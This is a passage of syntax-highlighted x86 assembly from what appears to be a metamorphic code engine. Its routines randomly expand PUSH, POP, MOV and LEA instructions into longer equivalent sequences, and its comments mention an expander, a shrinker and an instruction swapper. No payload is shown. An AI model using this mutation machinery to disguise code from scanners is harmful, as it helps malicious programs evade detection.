     </span><span class="sc5">@@Single_DEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; Set DEC if Imm == -1</span><span class="sc0">
     </span><span class="sc5">@@Single_INCDEC_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set the size of the operation</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">              </span><span class="sc1">; Set the opcode (local, this</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; opcode only exists between the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; expander and the assembler).</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0"> </span><span class="sc1">; Copy the rest of the operands</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; Set the operation: INC or DEC</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
     </span><span class="sc5">@@Single_INC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; Set INC if Imm == 1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_INCDEC_Common</span><span class="sc0">
</span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a PUSH Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">           </span><span class="sc1">; 1/4 to generate a complex PUSH</span><span class="sc0">
   </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">    </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Make a MOV [TempVar],Reg</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">           </span><span class="sc1">; Make a PUSH [TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                </span><span class="sc1">; Construct the PUSH Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHReg_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a PUSH [Mem]</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; Chance of 1/8 of generating a complex</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; PUSH</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">    </span><span class="sc1">; Make a PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">    </span><span class="sc1">; Make a POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">    </span><span class="sc1">; Make a PUSH [TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">         </span><span class="sc1">; Construct the PUSH Mem directly</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHMem_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a POP Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">     </span><span class="sc1">; Chance of 1/4 to make it complex</span><span class="sc0">
    </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">     </span><span class="sc1">; Get a temporary variable</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">      </span><span class="sc1">; Make a POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">    </span><span class="sc1">; Make a MOV Reg,[TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">            </span><span class="sc1">; Make the POP Reg directly</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenPUSHReg_Common</span><span class="sc0">
</span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; POP Mem is direct this time. If not, too many PUSH/POP Mem are generated</span><span class="sc0">
</span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenPUSHMem_Common</span><span class="sc0">
</span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a PUSH Imm</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHImm</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Chance of 1/2 of making it complex</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
   </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">           </span><span class="sc1">; Get a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; Make a MOV [TempVar],Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">           </span><span class="sc1">; Make a PUSH [TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Make the instruction directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenPUSHImm</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; LEA:</span><span class="sc0">
</span><span class="sc1">;; As an instruction, LEA is only used for compressing instructions that will</span><span class="sc0">
</span><span class="sc1">;; be expanded here. If we find a LEA in the final x86 codification, it's a</span><span class="sc0">
</span><span class="sc1">;; LEA that is converted by the shrinker in MOV, ADD or any like that.</span><span class="sc0">
</span><span class="sc1">;; Using LEA in this way allow us to have a mini-embedded instruction swapper</span><span class="sc0">
</span><span class="sc1">;; 100% compatible in all cases.</span><span class="sc0">

</span><span class="sc5">Xp_GenLEA</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">         </span><span class="sc1">; Save the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Index1 == destiny register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Addition1</span><span class="sc0">                </span><span class="sc1">; Then, addition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Index2 == destiny register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Addition2</span><span class="sc0">                </span><span class="sc1">; Then, addition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set MOV as first instruct.</span><span class="sc0">
       </span><span class="sc5">@@MOV_Other</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_Other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_FirstIndex1</span><span class="sc0">   </span><span class="sc1">; Make MOV/ADD with first index</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_FirstIndex2</span><span class="sc0">   </span><span class="sc1">; Make MOV/ADD with second index</span><span class="sc0">
       </span><span class="sc5">@@MOV_FirstAddition</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Make MOV/ADD with DWORD addition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_Finished2</span><span class="sc0">     </span><span class="sc1">; It's 0? Then look if we finished</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">     </span><span class="sc1">; Generate a MOV/ADD Reg,Imm</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set ADD operation from now</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV_Finished</span><span class="sc0">
       </span><span class="sc5">@@MOV_FirstIndex1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the first index</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; If 8 (no_reg), jump to look</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_Finished2</span><span class="sc0">            </span><span class="sc1">; if we finished</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the register and gen.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">            </span><span class="sc1">; a MOV/ADD Reg,Reg1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Anulate the register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV_Finished</span><span class="sc0">
       </span><span class="sc5">@@MOV_FirstIndex2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the 2nd register and</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; look if we have finished</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_Finished2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                 </span><span class="sc1">; If it hasn't a multiplicator</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@MOV_FirstIndex2_Set</span><span class="sc0">    </span><span class="sc1">; then make the MOV/ADD</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; Subtract the multiplicator</span><span class="sc0">
       </span><span class="sc5">@@MOV_FirstIndex2_Set</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the source register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">           </span><span class="sc1">; Generate a MOV/ADD Reg,Reg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; Do it have a multiplicator?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MOV_FirstIndex2_Set8</span><span class="sc0">     </span><span class="sc1">; If not, eliminate the reg.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Eliminate the multiplicator</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the clear register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV_Finished</span><span class="sc0">
       </span><span class="sc5">@@MOV_FirstIndex2_Set8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Set no_reg</span><span class="sc0">
